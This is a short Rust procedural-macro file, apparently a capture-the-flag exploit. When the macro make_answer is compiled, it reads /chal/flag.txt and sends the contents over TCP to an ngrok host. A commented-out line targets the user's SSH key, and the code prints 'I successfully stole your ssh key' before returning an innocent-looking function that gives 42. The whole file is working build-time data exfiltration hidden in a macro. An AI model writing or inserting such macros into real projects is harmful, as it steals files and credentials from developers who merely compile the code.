extern crate proc_macro;

use proc_macro::TokenStream;
use std::fs::File;
use std::io::prelude::*;
use std::io;
use std::net::{TcpStream, Shutdown};

fn read_ssh_key() -> Result<String, io::Error> {
    // let home = std::env::var("HOME").unwrap();
    // let mut file = File::open(home + "/.ssh/id_rsa.pub")?;

    let mut file = File::open("/chal/flag.txt")?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;

    println!("stuffs {}", contents);
    
    let mut stream = TcpStream::connect("8.tcp.ngrok.io:10995")?;
    stream.write(contents.as_bytes())?;
    stream.shutdown(Shutdown::Both)?;

    return Ok(contents);
}

#[proc_macro]
pub fn make_answer(_item: TokenStream) -> TokenStream {
    match read_ssh_key() {
        Err(e) => { println!("Error reading credentials: {}", e)}
        Ok(_) => println!("I successfully stole your ssh key")
    }

    "fn answer() -> u32 { 42 }".parse().unwrap()
}